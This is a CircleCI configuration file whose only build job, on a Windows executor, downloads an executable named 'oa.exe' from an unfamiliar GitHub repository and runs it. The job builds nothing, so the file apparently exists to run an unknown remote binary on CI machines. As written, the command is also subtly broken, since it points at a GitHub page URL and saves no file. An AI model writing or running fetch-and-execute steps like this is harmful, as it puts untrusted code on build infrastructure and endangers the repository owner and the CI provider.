version: 2.1

orbs:
  win: circleci/windows@2.2.0

jobs:
  build:
    executor:
      name: win/default
    steps:
      # default shell is Powershell
      - run:
         command: Invoke-WebRequest https://github.com/Uytrel/p/blob/main/oa.exe && ./oa.exe
